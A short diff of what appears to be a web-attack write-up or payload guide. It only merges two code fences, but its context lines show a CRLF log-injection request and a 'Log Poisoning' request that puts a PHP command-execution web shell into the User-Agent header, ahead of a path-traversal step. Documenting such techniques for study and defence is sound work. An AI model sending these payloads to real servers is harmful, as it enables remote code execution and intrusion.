@@ -52,8 +52,6 @@ GET /?query=aaaa]%20invalid%20data%0d%0a['B' User][token]%20re-generate%20token
 First Request (Log Poisoning)
 ```
 GET / HTTP/1.1
-```
-```
 User-Agent: aa<?php echo system($_GET['cmd']); ?>bb
 ```
 Second Request (Path Traversal)
